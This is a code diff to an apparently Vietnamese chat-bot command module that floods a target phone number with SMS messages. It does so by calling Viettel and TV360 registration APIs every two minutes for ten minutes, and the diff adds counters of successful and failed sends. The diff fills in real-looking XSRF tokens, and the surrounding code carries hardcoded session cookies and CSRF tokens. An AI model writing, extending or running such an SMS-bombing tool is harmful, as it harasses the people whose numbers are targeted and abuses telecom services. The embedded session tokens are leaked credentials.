@@ -18,7 +18,7 @@ module.exports = {
       'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
       '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
       'redirectLogin': 'https://viettel.vn/dang-ky',
-      'XSRF-TOKEN': 'your-xsrf-token-here',
+      'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
     };
 
     const viettelHeaders = {
@@ -32,7 +32,7 @@ module.exports = {
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
       'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
       'X-Requested-With': 'XMLHttpRequest',
-      'X-XSRF-TOKEN': 'your-xsrf-token-here',
+      'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
       'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
       'sec-ch-ua-mobile': '?0',
       'sec-ch-ua-platform': '"Windows"',
@@ -58,6 +58,11 @@ module.exports = {
       msisdn: phone
     };
 
+    // Initial message to be edited later
+    let messageID = null;
+    let successCount = 0;
+    let failureCount = 0;
+
     // Function to send spam requests
     const sendSpamRequests = () => {
       // Send request to Viettel API
@@ -67,10 +72,12 @@ module.exports = {
         cookies: viettelCookies,
       })
       .then(response => {
-        api.sendMessage(`Gửi thông báo thành công đến số ${phone} qua Viettel API`, event.threadID, event.messageID);
+        successCount++;
+        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
       })
       .catch(error => {
-        api.sendMessage(`Gửi thông báo thất bại đến số ${phone} qua Viettel API: ${error.message}`, event.threadID, event.messageID);
+        failureCount++;
+        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
       });
 
       // Send request to TV360 API
@@ -78,11 +85,26 @@ module.exports = {
         headers: tv360Headers
       })
       .then(response => {
-        api.sendMessage(`Gửi thông báo thành công đến số ${phone} qua TV360 API`, event.threadID, event.messageID);
+        successCount++;
+        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
       })
       .catch(error => {
-        api.sendMessage(`Gửi thông báo thất bại đến số ${phone} qua TV360 API: ${error.message}`, event.threadID, event.messageID);
+        failureCount++;
+        updateMessage(`Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`);
       });
+    };
+
+    // Function to update the message with success and failure count
+    const updateMessage = (text) => {
+      if (messageID) {
+        api.editMessage(text, event.threadID, messageID);
+      } else {
+        api.sendMessage(text, event.threadID, (error, messageInfo) => {
+          if (!error) {
+            messageID = messageInfo.messageID;
+          }
+        });
+      }
     };
 
     // Send the spam requests every 120 seconds (120000 milliseconds)
@@ -94,7 +116,7 @@ module.exports = {
     // Optionally, stop spamming after a certain time period
     setTimeout(() => {
       clearInterval(interval);
-      api.sendMessage(`Đã dừng spam SMS cho số ${phone}`, event.threadID, event.messageID);
+      api.sendMessage(`Đã dừng spam SMS cho số ${phone}. Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`, event.threadID, event.messageID);
     }, 600000); // Stop after 10 minutes (600000 milliseconds)
   }
 };
